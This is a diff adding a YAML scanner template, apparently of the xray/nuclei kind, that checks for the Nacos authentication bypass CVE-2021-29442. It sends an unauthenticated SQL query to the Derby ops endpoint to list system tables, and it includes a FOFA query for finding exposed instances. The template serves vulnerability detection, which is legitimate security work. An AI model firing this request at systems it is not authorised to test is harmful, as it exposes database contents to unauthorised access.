@@ -1,0 +1,16 @@
+id: poc-yaml-nacos-authentication-bypass
+info:
+  name: Nacos 身份认证绕过漏洞(CVE-2021-29442)
+  severity: high
+  tags:
+  - CVE-2021-29442
+  - 两高一弱
+  finger: nacos
+  fofa: title="nacos"
+requests:
+- method: GET
+  path: /nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
+  expression: status_code == 200 && contains(body,"data") && contains(body,"TABLENAME")
+    && contains(headers,"json")
+variables: {}
+transport: http
